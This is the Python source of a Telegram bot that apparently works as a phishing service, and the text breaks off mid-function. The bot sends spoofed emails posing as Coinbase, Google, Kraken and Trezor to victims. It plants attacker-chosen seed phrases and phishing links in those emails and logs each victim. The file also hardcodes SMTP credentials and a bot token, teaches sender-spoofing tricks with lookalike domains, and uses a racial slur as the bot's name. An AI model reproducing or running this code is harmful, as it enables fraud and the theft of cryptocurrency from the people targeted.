import logging
import sys
import json
import traceback
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
import smtplib
import os
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

sys.stdout.reconfigure(encoding="utf-8")


file_logger = logging.getLogger("file_logger")
file_logger.setLevel(logging.INFO)


file_handler = logging.FileHandler("bot_logs.log", mode="a", encoding="utf-8")
file_handler.setLevel(logging.INFO)


formatter = logging.Formatter("%(message)s")
file_handler.setFormatter(formatter)

file_logger.addHandler(file_handler)

email_count_file = "email_count.json"
log_file_path = "bot_logs.log"
file_handler = logging.FileHandler(log_file_path, mode="a", encoding="utf-8")

# SMTP server details
smtp_details = {
    'server': 'multihandsnw.co.uk',
    'port': 587,
    'username': 'knotting@multihandsnw.co.uk',
    'password': 'WonderArtistLong514$'
}


# Admin ID
ADMIN_ID = 7984584613

AMOUNT_TOKEN = 9 
CUSTOM_VICTIM_EMAIL, CUSTOM_SUBJECT, CUSTOM_SENDER_NAME, CUSTOM_DISPLAY_EMAIL, CUSTOM_HTML = range(5)
DISPLAY_NAME, RECIPIENTS, REPRESENTATIVE, CASE_ID, SEED_PHRASE, LINK, SPOOF_EMAIL = (
    range(7)
)

global_email_count = 0
user_email_counts = {}

HTML_TEMPLATE_PATH = "coinbase_template.html"
HTML_WALLET_TEMPLATE_PATH = "coinbase_wallet_template.html"
HTML_SECURE_TEMPLATE_PATH = "coinbase_secure_template.html"
HTML_GOOGLE_TEMPLATE_PATH = "google_template.html"
HTML_TREZOR_TEMPLATE_PATH = "trezor.html"
HTML_DELAY_TEMPLATE_PATH = "coinbase_transaction.html"

def load_email_counts():
    global global_email_count, user_email_counts
    if os.path.exists(email_count_file):
        with open(email_count_file, "r") as file:
            data = json.load(file)
            global_email_count = data.get("global_count", 0)
            user_email_counts = data.get("user_counts", {})
            # Ensure user_email_counts has unique keys
            user_email_counts = {str(k): v for k, v in user_email_counts.items()}
    else:
        global_email_count = 0
        user_email_counts = {}

def save_email_counts():
    with open(email_count_file, "w") as file:
        json.dump(
            {"global_count": global_email_count, "user_counts": user_email_counts}, file
        )


def log_email_details(update: Update, command_type: str, victim_email: str, extra_info: dict = None):
    """Logs email details for each command in the required format."""
    user = update.effective_user
    username = user.username if user.username else "Unknown"
    user_id = user.id
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")


    if command_type == "wallet_coinbase":
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | Seed phrase: {extra_info['seed_phrase']} | {current_time}"

    elif command_type == "secure_coinbase":
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | Link: {extra_info['link']} | {current_time}"

    else:
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | {current_time}"


    file_logger.info(log_message)

def increment_global_email_count(user_id):
    global global_email_count, user_email_counts
    global_email_count += 1
    user_id_str = str(user_id)
    user_email_counts[user_id_str] = user_email_counts.get(user_id_str, 0) + 1
    save_email_counts()

async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    donate_message = (
        "BTC: bc1qj8f5r29ksq3uq62eu6ycr9qt9sfz9hjkcvz00m\n"
        "ETH: 0x86FF30eF6fc3652345EEe0B01482a15FecE5DE00\n"
        "SOL: CmnkLiqxRh5cAMWLx3EewLn3Mpxw7KJbj7ox6hGPKX3p\n"
        "LTC: LNQpZvqp2BkaDoSviNMU7zATzNxxUyhvfP"
    )
    await update.message.reply_text(donate_message)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    start_message = (
        "Welcome to @NiggaSpoofer\n"
        "Support: @un0h4na\n\n"
        "This project is funded by donations!\n"
        "If you want me to eat and keep the SMTPs fresh, feel free to do /donate\n\n"
        "[Dono Leaderboard]\n\n"
        "[1] Anonymous - 1$\n"
        "[2]\n"
        "[3]\n\n"
        "[Info]\n\n"
        f"• Mails sent: {global_email_count}\n"
        f"• Your mails sent: {user_email_counts.get(str(update.effective_user.id), 0)}\n"
    )

    keyboard = [
        [KeyboardButton("Misc")],
        [KeyboardButton("Spoofing"), KeyboardButton("/donate")]
    ]

    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(start_message, reply_markup=reply_markup)

async def misc_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [KeyboardButton("/id"), KeyboardButton("/help")],
        [KeyboardButton("Back to Main Menu")]
    ]

    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("Misc Menu:", reply_markup=reply_markup)

async def coinbase_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [KeyboardButton("/employee_coinbase"), KeyboardButton("/wallet_coinbase")],
        [KeyboardButton("/secure_coinbase"), KeyboardButton("/coinbase_delay")],
        [KeyboardButton("Back to Main Menu")]
    ]

    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("Coinbase Menu:", reply_markup=reply_markup)

async def other_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [KeyboardButton("/employee_google")],
        [KeyboardButton("/employee_kraken")],
        [KeyboardButton("/employee_trezor")],
        [KeyboardButton("/custom_mail")],
        [KeyboardButton("Back to Main Menu")]
    ]

    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("Other Menu:", reply_markup=reply_markup)

async def back_to_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await start(update, context)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "Welcome to *Nigga Spoofer*\\! 🎭\n\n"
        "Please check @niggaspoofer for frequently asked questions\\. For custom spoofings, follow this protocol:\n\n"
        "1\\. *Directory Spoofing*:\n"
        "   Let's say you want to spoof `playboicarti\\.com`\\. For your email, you'll want it to end in one of the directories\\.\n"
        "   Example: Instead of `@playboicarti\\.com`, use `@playboicarti\\.com/tour`\\.\n\n"
        "2\\. *Admin Prefix*:\n"
        "   At the start of your email, add `admin`\\. Almost every website has an admin email\\.\n\n"
        "3\\. *Research*:\n"
        "   For example, `ice\\.gov` has an email `iceprivacy@ice\\.gov`\\. \\(Google: `\\(company you want to spoof\\) \\+ email` to find these\\.\\)\n"
        "   Then, just add a directory like `/help` and spoof `iceprivacy@ice\\.gov/help`\\.\n\n"
        "I won't explain the technicals here because it would suck\\! 😉 Happy spoofing\\! 🚀"
    )
    await update.message.reply_text(help_text, parse_mode="MarkdownV2")

async def get_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await update.message.reply_text(f"Your user ID is: {user_id}")




async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:

    await update.message.reply_text("Email sending cancelled.")
    context.user_data.clear()
    return ConversationHandler.END


async def get_recipients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Get recipient emails and move to spoof email selection."""
    context.user_data["recipients"] = update.message.text

    if context.user_data.get("conversation") == "employee_kraken":
        keyboard = [
            [InlineKeyboardButton("help@kraken", callback_data="help@kraken")],
            [InlineKeyboardButton("no-reply@kraken.com/help", callback_data="no-reply@kraken.com/help")]
        ]
    elif context.user_data.get("conversation") == "employee_coinbase":
        keyboard = [
            [InlineKeyboardButton("help@coinbase", callback_data="help@coinbase")],
            [InlineKeyboardButton("no-reply@coinbase.com/help", callback_data="no-reply@coinbase.com/help")],
            [InlineKeyboardButton("help@coínbase.com", callback_data="help@coínbase.com")]
        ]
    elif context.user_data.get("conversation") == "coinbase_delay":
        keyboard = [
            [InlineKeyboardButton("help@coinbase", callback_data="help@coinbase")],
            [InlineKeyboardButton("no-reply@coinbase.com/help", callback_data="no-reply@coinbase.com/help")],
            [InlineKeyboardButton("help@coínbase.com", callback_data="help@coínbase.com")]
        ]          
    elif context.user_data.get("conversation") == "employee_google":
        keyboard = [
            [InlineKeyboardButton("help@google", callback_data="help@google")],
            [InlineKeyboardButton("david@google.com/support", callback_data="david@google.com/support")]
        ]
    elif context.user_data.get("conversation") == "employee_trezor":
        keyboard = [
            [InlineKeyboardButton("help@trezor", callback_data="help@trezor")],
            [InlineKeyboardButton("no-reply@trezor.io/help", callback_data="no-reply@trezor.io/help")]
        ]
    else:
        keyboard = [
            [InlineKeyboardButton("help@coinbase", callback_data="help@coinbase")],
            [InlineKeyboardButton("no-reply@coinbase.com/help", callback_data="no-reply@coinbase.com/help")],
            [InlineKeyboardButton("help@coínbase.com", callback_data="help@coínbase.com")]
        ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Spoof as:", reply_markup=reply_markup)
    return SPOOF_EMAIL

async def custom_mail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Initiates the custom email flow."""


    await update.message.reply_text("Enter the victim email address:")
    return CUSTOM_VICTIM_EMAIL

async def get_custom_victim_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the victim email and asks for the email subject."""
    context.user_data["victim_email"] = update.message.text
    await update.message.reply_text("Enter the subject of the email:")
    return CUSTOM_SUBJECT

async def get_custom_subject(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the subject and asks for the sender name."""
    context.user_data["subject"] = update.message.text
    await update.message.reply_text("Enter the display name:")
    return CUSTOM_SENDER_NAME

async def get_custom_sender_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the sender name and asks for the display email."""
    context.user_data["sender_name"] = update.message.text
    await update.message.reply_text("Enter the spoofed email (ex. help@coinbase):")
    return CUSTOM_DISPLAY_EMAIL

async def get_custom_display_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the display email and asks for the HTML file to send."""
    context.user_data["display_email"] = update.message.text
    await update.message.reply_text("Upload the HTML file:")
    return CUSTOM_HTML

async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives the HTML file and sends the email."""
    if update.message.document:
        file = await update.message.document.get_file()
        html_content = await file.download_as_bytearray()

      
        context.user_data["html_content"] = html_content.decode("utf-8")

  
        victim_email = context.user_data["victim_email"]
        subject = context.user_data["subject"]
        sender_name = context.user_data["sender_name"]
        display_email = context.user_data["display_email"]
        html_body = context.user_data["html_content"]

  
        msg = MIMEMultipart("related")
        msg["Subject"] = subject
        msg["From"] = f"{sender_name} <{display_email}>"
        msg["To"] = victim_email
        msg.attach(MIMEText(html_body, "html", "utf-8"))

        try:
            send_email_through_smtp(
                sender_name,
                smtp_details["username"],
                subject,
                msg,
                victim_email,
                context.effective_user.id
            )
            await update.message.reply_text("Custom email sent successfully!")
        except Exception as e:
            await update.message.reply_text(f"Failed to send email: {str(e)}")

   
        context.user_data.clear()
        return ConversationHandler.END
    else:
        await update.message.reply_text("Please upload a valid HTML file.")
        return CUSTOM_HTML

async def wallet_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Coinbase wallet email, asks only for the seed phrase."""
    

    context.user_data.clear()
    context.user_data["conversation"] = "wallet_coinbase"
    await update.message.reply_text("Enter the victim email address:")
    return RECIPIENTS

async def employee_google(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:

    context.user_data.clear()
    context.user_data["conversation"] = "employee_google"
    await update.message.reply_text("Enter the victim email address:")
    return RECIPIENTS

async def secure_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for secure Coinbase emails with balance deduction."""


    context.user_data.clear()
    context.user_data["conversation"] = "secure_coinbase"
    await update.message.reply_text("Enter the victim email address:")
    return RECIPIENTS

async def employee_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Coinbase employee email with balance deduction."""


    context.user_data.clear()
    context.user_data["conversation"] = "employee_coinbase"
    await update.message.reply_text("Enter the victim email address:")
    return RECIPIENTS

async def spoof_email_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["display_email"] = query.data
    await query.edit_message_text(text=f"Spoofing email as: {query.data}")

    if context.user_data.get("conversation") == "coinbase_delay":
        await query.message.reply_text("Enter the amount and token symbol for the transaction (e.g., '1000 USDC' or '1 BTC'):")
        return AMOUNT_TOKEN
    elif context.user_data.get("conversation") == "wallet_coinbase":
        await query.message.reply_text("Enter the seed phrase:")
        return SEED_PHRASE
    else:
        await query.message.reply_text("Enter the representative name:")
        return REPRESENTATIVE

    
async def get_amount_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:

        user_input = update.message.text.strip().split()
        if len(user_input) != 2:
            await update.message.reply_text("Please enter a valid amount and token symbol, e.g., '1000 USDC'.")
            return AMOUNT_TOKEN
        
    
        amount = (user_input[0])
        token_symbol = user_input[1].upper()

        context.user_data["amount"] = amount
        context.user_data["token_symbol"] = token_symbol

        await update.message.reply_text(f"Amount set to: {amount}, Token symbol set to: {token_symbol}. Now enter the delay link:")
        return LINK
    except ValueError:
        await update.message.reply_text("Please enter a valid number for the amount.")
        return AMOUNT_TOKEN


# Add the new command handler for broadcasting messages
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return

    await update.message.reply_text("Enter the message to broadcast:")
    return BROADCAST_MESSAGE

async def get_broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    message = update.message.text
    user_ids = get_all_user_ids()

    for user_id in user_ids:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
        except Exception as e:
            logging.error(f"Failed to send message to {user_id}: {str(e)}")

    await update.message.reply_text("Broadcast message sent.")
    return ConversationHandler.END

def get_all_user_ids():
    user_ids = set()
    with open(log_file_path, "r", encoding="utf-8") as file:
        for line in file:
            parts = line.split(" / ")
            if len(parts) > 1:
                user_id = parts[1].split(" | ")[0]
                user_ids.add(user_id)
    return user_ids


async def get_representative(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["representative"] = update.message.text

    if context.user_data.get("conversation") == "secure_coinbase":
        await update.message.reply_text("Enter the case ID:")
        return CASE_ID
    else:
        await update.message.reply_text("Enter the case ID:")
        return CASE_ID

async def get_case_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["case_id"] = update.message.text

    if context.user_data.get("conversation") == "employee_trezor":
        recipients = context.user_data["recipients"]
        representative = context.user_data["representative"]
        case_id = context.user_data["case_id"]
        display_email = context.user_data["display_email"]


        message = await send_employee_trezor_email(
            update, recipients, representative, case_id, display_email
        )
        await update.message.reply_text(message)
        return ConversationHandler.END
    elif context.user_data.get("conversation") == "employee_kraken":
        recipients = context.user_data["recipients"]
        representative = context.user_data["representative"]
        case_id = context.user_data["case_id"]
        display_email = context.user_data["display_email"]


        message = await send_employee_kraken_email(
            update, recipients, representative, case_id, display_email
        )
        await update.message.reply_text(message)
        return ConversationHandler.END
    elif context.user_data.get("conversation") == "secure_coinbase":
        await update.message.reply_text("Enter the secure link:")
        return LINK
    elif context.user_data.get("conversation") == "employee_coinbase":
        recipients = context.user_data["recipients"]
        representative = context.user_data["representative"]
        case_id = context.user_data["case_id"]
        display_email = context.user_data["display_email"]


        message = await send_employee_coinbase_email(
            update, recipients, representative, case_id, display_email
        )
        await update.message.reply_text(message)
        return ConversationHandler.END
    else:

        recipients = context.user_data["recipients"]
        representative = context.user_data["representative"]
        case_id = context.user_data["case_id"]
        display_email = context.user_data["display_email"]

        message = await send_employee_google_email(
            update, recipients, representative, case_id, display_email
        )
        await update.message.reply_text(message)
        return ConversationHandler.END


async def get_seed_phrase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["seed_phrase"] = update.message.text
    recipients = context.user_data["recipients"]
    seed_phrase = context.user_data["seed_phrase"]
    display_email = context.user_data["display_email"]

    message = await send_wallet_coinbase_email(
        update, recipients, seed_phrase, display_email
    )
    await update.message.reply_text(message)
    return ConversationHandler.END

async def get_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["link"] = update.message.text


    recipients = context.user_data["recipients"]
    link = context.user_data["link"]
    display_email = context.user_data["display_email"]  

    if context.user_data.get("conversation") == "coinbase_delay":
       
        message = await send_coinbase_delay_email(
            update, context, recipients, link, display_email 
        )
        await update.message.reply_text(message)
        return ConversationHandler.END
    else:
       
        representative = context.user_data["representative"]
        case_id = context.user_data["case_id"]

        message = await send_secure_coinbase_email(
            update, recipients, link, representative, case_id, display_email
        )
        await update.message.reply_text(message)

    context.user_data.clear()
    return ConversationHandler.END





async def send_employee_coinbase_email(
    context, recipients, representative, case_id, display_email
):
    """Send the Employee Coinbase Email."""
    template_path = HTML_TEMPLATE_PATH  

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()

   
    html_body = html_body.replace(
        "Daniel Greene", representative
    ) 
    html_body = html_body.replace("1835246", case_id)

    msg = MIMEMultipart("related")
    msg["Subject"] = "Case Review" 
   # msg['Reply-To'] = 'support@coinbase.com'
    msg["From"] = f"Coinbase <{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)

    try:
  
        with open("coinbase.png", "rb") as img_file:
            img = MIMEImage(img_file.read(), name="coinbase.png")
            img.add_header("Content-ID", "<logo>")
            msg.attach(img)

        send_email_through_smtp(
            "Coinbase",
            smtp_details["username"],
            "Coinbase Case Review",
            msg,
            recipients,
            context.effective_user.id
        )
        log_email_details(context, "employee_coinbase", recipients, {"representative": representative, "case_id": case_id}) 
        return "Coinbase Employee Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"




async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_email):
    """Send the Coinbase Wallet Email."""
   
    log_email_details(
        context, "wallet_coinbase", recipients, {"seed_phrase": seed_phrase}
    )

    template_path = HTML_WALLET_TEMPLATE_PATH

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()

    html_body = html_body.replace("seed_placeholder", seed_phrase)

    msg = MIMEMultipart("related")
    msg["Subject"] = "ACTION NEEDED: Secure your assets to self-custody"
    #msg['Reply-To'] = 'support@coinbase.com'
    msg["From"] = f"Coinbase <{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)

    try:
        with open("wallet.png", "rb") as img_file:
            img = MIMEImage(img_file.read(), name="wallet_coinbase.png")
            img.add_header("Content-ID", "<logo>")
            msg.attach(img)

        send_email_through_smtp(
            "Coinbase",
            smtp_details["username"],
            "Secure your assets to self-custody",
            msg,
            recipients,
            context.effective_user.id
        )
        return "Coinbase Wallet Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"

async def send_secure_coinbase_email(
    context, recipients, link, representative, case_id, display_email
):
    """Send the Secure Coinbase Email with a link and attached images."""
    template_path = HTML_SECURE_TEMPLATE_PATH

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()


    html_body = html_body.replace("Daniel Greene", representative)
    html_body = html_body.replace("1835246", case_id)
    html_body = html_body.replace("https://link.com", link)

    msg = MIMEMultipart("related")
    msg["Subject"] = "Secure Coinbase Token"
    msg["From"] = f"Coinbase <{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)


    try:
        with open("coinbase.png", "rb") as img_file:
            img = MIMEImage(img_file.read(), name="coinbase.png")
            img.add_header("Content-ID", "<logo>")
            msg.attach(img)

        send_email_through_smtp(
            "Coinbase",
            smtp_details["username"],
            "Secure Coinbase Token",
            msg,
            recipients,
            context.effective_user.id
        )
        log_email_details(context, "secure_coinbase", recipients, {"link": link}) 
        return "Coinbase Secure Link Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"

async def send_employee_google_email(
    context, recipients, representative, case_id, display_email
):
    """Send the Employee Google Email with attached images."""

    log_email_details(
        context,
        "employee_google",
        recipients,
        {"representative": representative, "case_id": case_id},
    )

    template_path = HTML_GOOGLE_TEMPLATE_PATH

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()


    html_body = html_body.replace("Daniel Greene", representative)
    html_body = html_body.replace("1835246", case_id)

    msg = MIMEMultipart("related")
    msg["Subject"] = "Case Review"
    msg['Reply-To'] = 'no-reply@google.com'
    msg["From"] = f"<{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)


    try:
        with open("google_logo.png", "rb") as img_file:
            img = MIMEImage(img_file.read(), name="google_logo.png")
            img.add_header("Content-ID", "<logo>")
            msg.attach(img)

        send_email_through_smtp(
            "Google", smtp_details["username"], "Google Case Review", msg, recipients, context.effective_user.id
        )
        return "Google Employee Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"

async def employee_kraken(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Kraken employee email with balance deduction."""


    context.user_data.clear()
    context.user_data["conversation"] = "employee_kraken"
    await update.message.reply_text("Enter the victim email address:")
    return RECIPIENTS

async def employee_trezor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Trezor employee email with balance deduction."""

    context.user_data.clear()
    context.user_data["conversation"] = "employee_trezor"
    await update.message.reply_text("Enter the victim email address:")
    return RECIPIENTS


async def send_employee_trezor_email(
    context, recipients, representative, case_id, display_email
):
    """Send the Employee Trezor Email."""
    template_path = HTML_TREZOR_TEMPLATE_PATH 

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()

  
    html_body = html_body.replace("Daniel Greene", representative)
    html_body = html_body.replace("1386215", case_id)

    msg = MIMEMultipart("related")
    msg["Subject"] = "Your case is under review"
    msg["From"] = f"Trezor <{display_email}>"
    msg['Reply-To'] = 'help@trezor.io'
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)

    try:
     
        with open("trezor.png", "rb") as img_file:
           
            img = MIMEImage(img_file.read(), name="trezor.png")
            img.add_header("Content-ID", "<logo>")
            msg.attach(img)

        send_email_through_smtp(
            "Trezor",
            smtp_details["username"],
            "Your case is under review",
            msg,
            recipients,
            context.effective_user.id
        )
        log_email_details(context, "employee_trezor", recipients, {"representative": representative, "case_id": case_id})
        return "Trezor Employee Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"



async def spoof_email_choice_kraken(
    update: Update, context: ContextTypes.DEFAULT_TYPE
) -> int:
    """Handles the spoof email choice for Kraken."""
    query = update.callback_query
    await query.answer()
    context.user_data["display_email"] = query.data
    await query.edit_message_text(text=f"Spoofing email as: {query.data}")

   
    await query.message.reply_text("Enter the representative name:")
    return REPRESENTATIVE

async def send_employee_kraken_email(
    context, recipients, representative, case_id, display_email
):
    """Send the Employee Kraken Email with attached images."""
   
    log_email_details(
        context,
        "employee_kraken",
        recipients,
        {"representative": representative, "case_id": case_id},
    )

    template_path = "kraken.html"

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()

 
    html_body = html_body.replace("Daniel Greene", representative)
    html_body = html_body.replace("1835246", case_id)

  
    msg = MIMEMultipart("related")
    msg["Subject"] = "Your case is under review"
    msg['Reply-To'] = 'no-reply@kraken.com'
    msg["From"] = f"Kraken <{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)


    for image in ["kraken.png", "kraken1.png", "kraken2.png"]:
        try:
            with open(image, "rb") as img_file:
                img = MIMEImage(img_file.read(), name=image)
                img.add_header("Content-ID", f"<{image}>")
                msg.attach(img)
        except Exception as e:
            return f"Failed to attach the image {image}: {e}"

    try:
        send_email_through_smtp(
            "Kraken",
            smtp_details["username"],
            "Your case is under review",
            msg,
            recipients,
            context.effective_user.id
        )
        return "Kraken Employee Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"

async def coinbase_delay(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Coinbase delay email."""

    context.user_data.clear()
    context.user_data["conversation"] = "coinbase_delay"
    await update.message.reply_text("Enter the victim email address:")
    return RECIPIENTS



async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAULT_TYPE, recipients, link, display_email):
    """Send the Coinbase Delay Email with the manual review link."""
    template_path = HTML_DELAY_TEMPLATE_PATH

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    amount = context.user_data.get("amount", 0)
    token_symbol = context.user_data.get("token_symbol", "USDC")

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()


    html_body = html_body.replace("529.75", f"{amount}")
    html_body = html_body.replace("USDC", token_symbol)
    html_body = html_body.replace("Cancel my <b>529.75 USDC</b>", f"Cancel my <b>{amount} {token_symbol}</b>")
    html_body = html_body.replace("https://link.com", link)

    msg = MIMEMultipart("related")
    msg["Subject"] = "A manual review is pending"
    #    msg['Reply-To'] = 'support@coinbase.com'
    msg["From"] = f"Coinbase <{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)

    try:
        with open("coinbase.png", "rb") as img_file:
            img = MIMEImage(img_file.read(), name="coinbase.png")
            img.add_header("Content-ID", "<logo>")
            msg.attach(img)

        send_email_through_smtp(
            "Coinbase",
            smtp_details["username"],
            "A manual review is pending",
            msg,
            recipients,
            context.effective_user.id
        )
        log_email_details(update, "coinbase_delay", recipients, {"link": link, "amount": amount, "token_symbol": token_symbol})
        return "Coinbase Delay Email sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"



# Add the new conversation handler for broadcasting messages
BROADCAST_MESSAGE = range(1)

broadcast_handler = ConversationHandler(
    entry_points=[CommandHandler("broadcast", broadcast)],
    states={
        BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_broadcast_message)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)




def send_email_through_smtp(display_name, smtp_username, subject, msg, recipients, user_id):
    try:
        recipient_list = (
            recipients.split(",") if isinstance(recipients, str) else recipients
        )

        with smtplib.SMTP(smtp_details["server"], smtp_details["port"]) as server:
            server.starttls()
            server.login(smtp_username, smtp_details["password"])

            server.sendmail(smtp_username, recipient_list, msg.as_string())

        logging.info(f"{display_name} email sent successfully to {recipients}")

        # Increment the global and user email count
        increment_global_email_count(user_id)

    except Exception as e:
        logging.error(f"Failed to send email: {str(e)}")
        raise e

def main():
    load_email_counts()


    TOKEN = "7913920205:AAEEHW_QOaFQcH1zjwUXSru84iWNRTRSWsU"
    application = ApplicationBuilder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", get_user_id))

    wallet_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("wallet_coinbase", wallet_coinbase)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
            SEED_PHRASE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_seed_phrase)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    employee_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("employee_coinbase", employee_coinbase)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
            REPRESENTATIVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
            ],
            CASE_ID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)
            ], 
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    secure_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("secure_coinbase", secure_coinbase)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
            REPRESENTATIVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
            ],
            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
            LINK: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_link)
            ], 
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    employee_google_handler = ConversationHandler(
        entry_points=[CommandHandler("employee_google", employee_google)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
            REPRESENTATIVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
            ],
            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    employee_kraken_handler = ConversationHandler(
        entry_points=[CommandHandler("employee_kraken", employee_kraken)],
        states={
            RECIPIENTS: [
